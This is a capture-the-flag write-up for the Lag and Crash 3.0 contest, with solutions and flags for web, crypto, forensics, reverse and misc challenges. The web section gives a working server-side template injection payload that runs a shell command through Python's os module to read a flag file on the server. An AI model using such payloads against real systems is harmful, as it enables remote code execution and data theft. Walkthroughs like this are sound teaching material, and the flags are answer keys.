# Lag and Crash 3.0

https://ctf.lagncra.sh/challenges

## Challenges

### Web
- [DotDashDot](#dotdashdot)

### Crypto
- [You Don't Know About Us](#you-dont-know-about-us)

### Forensics
- [Base Madness](#base-madness)

### Reverse
- [First Program](#first-program)

### Misc
- [Hidden in Plain Sight](#hidden-in-plain-sight)

-------

## Web

### DotDashDot

Description: _An ancient relic of the past... what's it doing here?_

http://dotdashdot.d.lagncra.sh

There is one comment in html source 

<img width="233" alt="image" src="https://user-images.githubusercontent.com/79740895/231981877-0bf5621b-99ad-444c-8fa1-f42b2e848fcf.png">

http://dotdashdot.d.lagncra.sh/translate

<img width="475" alt="image" src="https://user-images.githubusercontent.com/79740895/231982345-cbbd17fb-bd74-4f22-97bf-d8e29d99f035.png">

It will convert our input to morse code and it is vulnerable to SSTI.

test payload: `--> {{8*8}}`

<img width="330" alt="image" src="https://user-images.githubusercontent.com/79740895/231982840-ee4dbd56-8c82-4a10-bda5-89f553eabe49.png">

Now we can use RCE payload to read flag

Payload: `-->{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /www/flag.txt').read() }}`

<img width="458" alt="image" src="https://user-images.githubusercontent.com/79740895/231983204-6f38a96f-67a4-4d83-a804-54b622a1c631.png">

```
flag: LNC2023{T3mpl4t35_4r3_c00L_bUt_d4nG3r0u5_776843}
```




----------

## Crypto

### You Don't Know About Us

Description: _You ain’t gonna understand our language!

JZUWGZJAORZHSIDIOVWWC3RBEBKGQ2LTEBUXGIDUNBSSAYLDOR2WC3BAMVXGG33EMVSCA3LFONZWC43HMU5AUQSEKMZDAMRTPN2GWY3SORVWG4T5_

It is Base32 > Rot 10(Rot13 with n=10)

```
flag:  LNC2023{dumbdumb}
```






---------
## Forensics

### Base Madness

Description: _Zip files and encryptions were used often in the modern times. You came across this 2 files. One containing a text one is a zip file. Are you able to decipher it?_

two files are given: base_madness.txt, base_madness.zip

base_madness.txt is base64 encoded: `thisisthepasswordtounlockthefile`

unzip the file with this file. There is one image ayaka.jpg 

open this image with notepad there is flag.

<img width="361" alt="image" src="https://user-images.githubusercontent.com/79740895/231988288-e124c423-d078-4d08-ae81-70ea09e39c77.png">

```
flag:  LNC2023{ayaka_is_key}
```








-------

## Reverse

### First Program

Description: _This is the first program that was created in the Dystopian times can you help find the flag inside it?_

one file is given: simplere

simplere: ELF 64-bit LSB pie executable

open this in Ghidra

we can see flag in side main()

<img width="268" alt="image" src="https://user-images.githubusercontent.com/79740895/232018262-723d7321-8bc6-47dd-b149-d2645c67e656.png">

```
flag: LNC2023{s1mpl3_4m_1_r1ghT?}
```













--------

## Misc

### Hidden in Plain Sight

Description: _UGH Ansi screwed up again! I wonder what sequence of events lead to this._

nc nc.lagncra.sh 8004

connecting to this is not showing anythig so let's try to save this in file.

<img width="247" alt="image" src="https://user-images.githubusercontent.com/79740895/232020790-da910eb6-16cf-4283-9c65-8220a2c03f61.png">

open this file with editor

<img width="242" alt="image" src="https://user-images.githubusercontent.com/79740895/232021141-395e8cbb-aa7b-4f72-8ba6-df3eb2c2348a.png">

There is flag. 

less command also works. ` cat 1.txt |less `

```
flag: LNC2023{ans1_c0ntr0l_s3qu3nc3s_damn_c00l}
```











